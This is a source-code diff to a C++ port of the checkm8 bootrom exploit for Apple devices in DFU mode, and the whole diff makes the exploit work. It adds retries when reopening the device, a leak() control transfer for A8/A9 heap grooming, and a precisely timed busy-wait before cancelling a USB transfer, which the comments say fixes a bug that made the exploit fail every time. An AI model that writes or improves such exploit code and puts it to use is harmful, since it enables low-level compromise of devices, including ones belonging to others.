@@ -164,7 +164,20 @@ bool DFU::isExploited()
 
 bool DFU::acquire_device(bool Silent)
 {
-  devh = libusb_open_device_with_vid_pid(NULL, idVendor, idProduct);
+  // The device re-enumerates between exploit stages, so the USB node may
+  // briefly disappear (enumeration delay, udev permission relabel). Retry
+  // for a short window instead of bailing out on the first miss.
+  const int max_attempts = 50; // ~5s at 100ms each
+  devh = nullptr;
+  for (int attempt = 0; attempt < max_attempts && !devh; attempt++)
+  {
+    devh = libusb_open_device_with_vid_pid(NULL, idVendor, idProduct);
+    if (!devh)
+    {
+      struct timespec ts = {0, 100 * 1000 * 1000}; // 100ms
+      nanosleep(&ts, NULL);
+    }
+  }
   if (!devh)
   {
     printf("[!] Could not find device in DFU mode!\n");
@@ -227,6 +240,13 @@ void DFU::stall()
   libusb1_async_ctrl_transfer(0x80, 6, 0x304, 0x40A, Buffer, 0.00001);
 }
 
+void DFU::leak()
+{
+  // Matches ipwndfu's leak(): wLength 0xC0 (usb_req_leak uses 0x40, no_leak
+  // uses 0xC1). The A8/A9 stage-1 grooming requires leak(), not usb_req_leak().
+  libusb1_no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, nullptr, 0xC0, 1);
+}
+
 void DFU::no_leak()
 {
   libusb1_no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, nullptr, 0xC1, 1);
@@ -270,20 +290,21 @@ bool DFU::libusb1_async_ctrl_transfer(int bmRequestType, int bRequest,
     request_timeout = (int)timeout;
   }
 
-  auto start = time(nullptr);
-
-  std::vector<uint8_t> Request;
-  append(Request, (uint8_t)bmRequestType);
-  append(Request, (uint8_t)bRequest);
-  append(Request, (uint16_t)wValue);
-  append(Request, (uint16_t)wIndex);
-  append(Request, (uint16_t)data.size());
-  assert(Request.size() == 8);
-  appendV(Request, data);
-  auto rawRequest = libusb1_create_ctrl_transfer(Request, request_timeout);
+  // Keep the request buffer alive past this function (see async_request in
+  // dfu.h). The submitted URB references this memory until it is cancelled.
+  async_request.clear();
+  append(async_request, (uint8_t)bmRequestType);
+  append(async_request, (uint8_t)bRequest);
+  append(async_request, (uint16_t)wValue);
+  append(async_request, (uint16_t)wIndex);
+  append(async_request, (uint16_t)data.size());
+  assert(async_request.size() == 8);
+  appendV(async_request, data);
+  auto rawRequest = libusb1_create_ctrl_transfer(async_request, request_timeout);
+  async_transfer = rawRequest;
 
   // Debug out
-  printBuffer(Request);
+  printBuffer(async_request);
 
   // Submit transfer
   int r = libusb_submit_transfer(rawRequest);
@@ -294,12 +315,32 @@ bool DFU::libusb1_async_ctrl_transfer(int bmRequestType, int bRequest,
     exit(1);
   }
 
-  // Wait for timeout
-  int i = 0;
-  int t = (timeout / 1000.0);
-  while ((time(nullptr) - start) < t)
+  // Busy-wait, then abort the transfer mid-flight. checkm8's heap grooming
+  // relies on the transfer being submitted and then cancelled after a short,
+  // precise delay. This mirrors ipwndfu exactly:
+  //
+  //   while time.time() - start < timeout / 1000.0: pass
+  //
+  // i.e. the wait is `timeout / 1000.0` seconds (for timeout=0.0001 that is
+  // 1e-7 s), spun on a high-resolution monotonic clock.
+  //
+  // The previous implementation used `int t = timeout / 1000.0` with
+  // time(nullptr) (1-second resolution), which truncated any sub-second wait to
+  // 0 and cancelled the transfer immediately, so the grooming never happened
+  // and the exploit failed every time.
   {
-    i++;
+    const double wait_s = timeout / 1000.0;
+    struct timespec start_ts;
+    clock_gettime(CLOCK_MONOTONIC, &start_ts);
+    while (true)
+    {
+      struct timespec now_ts;
+      clock_gettime(CLOCK_MONOTONIC, &now_ts);
+      double elapsed = (now_ts.tv_sec - start_ts.tv_sec) +
+                       (now_ts.tv_nsec - start_ts.tv_nsec) / 1e9;
+      if (elapsed >= wait_s)
+        break;
+    }
   }
 
   r = libusb_cancel_transfer(rawRequest);
